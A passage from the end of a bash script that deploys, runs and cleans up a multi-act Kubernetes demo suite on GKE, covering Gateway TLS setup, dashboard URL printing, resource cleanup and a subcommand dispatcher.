  echo "  Chronos Split-Brain Lab UI (HTTPS) : https://timewarp.${DEMO_DOMAIN}/dashboard"
  echo "  Chronos Split-Brain Lab UI (LB IP) : http://${lb_ip:-<pending>}/dashboard"
  echo ""
}

deploy_gateway_tls() {
  detect_cluster_defaults
  banner "Deploying GKE Gateway API + Certificate Manager TLS (*.${DEMO_DOMAIN})"

  envsubst < "${REPO_ROOT}/manifests/gateway-tls.yaml.tmpl" | kubectl apply -f -

  local gw_ip=""
  for _ in {1..45}; do
    gw_ip="$(kubectl get gateway anything-but-agents-gateway -n anything-but-agents -o jsonpath='{.status.addresses[0].value}' 2>/dev/null || true)"
    if [[ -n "${gw_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Gateway IP (${GATEWAY_IP_NAME}) : ${gw_ip:-<provisioning>}"
  echo "  1. Dungeon 2D Roguelike      : https://dungeon.${DEMO_DOMAIN}/play"
  echo "     Dungeon 2D Dashboard      : https://dungeon.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  2. Cold-Start HPA Race       : https://coldstart.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  3. TenantDB Storage X-Ray    : https://tenantdb.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  4. Truman Show Honeypot      : https://honeypot.${DEMO_DOMAIN}/"
  echo "  5. Chronos Time-Warp Lab     : https://timewarp.${DEMO_DOMAIN}/dashboard"
  echo ""
}

cleanup_gateway_tls() {
  banner "Cleaning up GKE Gateway API + HTTPRoutes"
  envsubst < "${REPO_ROOT}/manifests/gateway-tls.yaml.tmpl" | kubectl delete --ignore-not-found -f -
}

cleanup_timewarp_gateway() {
  banner "Cleaning up Time-Warp Gateway Deployment & Actors"
  for act in raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,serviceaccount timewarp-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding timewarp-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding timewarp-gateway-ate-client --ignore-not-found
  free_workers
}

run_all_acts() {
  ensure_router_port_forward
  act1_dungeon
  act1b_dungeon2d
  act2_coldstart
  act3_tenantdb
  act4_honeypot
  act5_timewarp
}

cleanup_all() {
  banner "Cleaning up 'Anything But Agents' resources"
  cleanup_dungeon2d_gateway
  cleanup_coldstart_hpa
  cleanup_tenantdb_gateway
  cleanup_honeypot_gateway
  cleanup_timewarp_gateway
  cleanup_gateway_tls
  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true
  for tmpl in dungeon dungeon2d coldstart tenantdb honeypot timewarp; do
    kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete atespace "${ATESPACE}" 2>/dev/null || true
  kubectl delete namespace anything-but-agents --ignore-not-found
}

case "${1:-}" in
  bootstrap-gke)         bootstrap_gke ;;
  deploy)                deploy_all ;;
  deploy-dungeon2d)      deploy_dungeon2d_gateway ;;
  cleanup-dungeon2d)     cleanup_dungeon2d_gateway ;;
  deploy-coldstart-hpa)  deploy_coldstart_hpa ;;
  cleanup-coldstart-hpa) cleanup_coldstart_hpa ;;
  deploy-tenantdb)       deploy_tenantdb_gateway ;;
  cleanup-tenantdb)      cleanup_tenantdb_gateway ;;
  deploy-honeypot)       deploy_honeypot_gateway ;;
  cleanup-honeypot)      cleanup_honeypot_gateway ;;
  deploy-timewarp)       deploy_timewarp_gateway ;;
  cleanup-timewarp)      cleanup_timewarp_gateway ;;
  deploy-gateway-tls)    deploy_gateway_tls ;;
  cleanup-gateway-tls)   cleanup_gateway_tls ;;
  run-all)               run_all_acts ;;
  act1-dungeon)          act1_dungeon ;;
  act1b-dungeon2d)       act1b_dungeon2d ;;
  act2-coldstart)        act2_coldstart ;;
  act3-tenantdb)         act3_tenantdb ;;
  act4-honeypot)         act4_honeypot ;;
  act5-timewarp)         act5_timewarp ;;
  cleanup)               cleanup_all ;;
  *)
    echo "Usage: $0 {bootstrap-gke|deploy|deploy-dungeon2d|cleanup-dungeon2d|deploy-coldstart-hpa|cleanup-coldstart-hpa|deploy-tenantdb|cleanup-tenantdb|deploy-honeypot|cleanup-honeypot|deploy-timewarp|cleanup-timewarp|deploy-gateway-tls|cleanup-gateway-tls|run-all|act1-dungeon|act1b-dungeon2d|act2-coldstart|act3-tenantdb|act4-honeypot|act5-timewarp|cleanup}" >&2
    exit 1
    ;;
esac
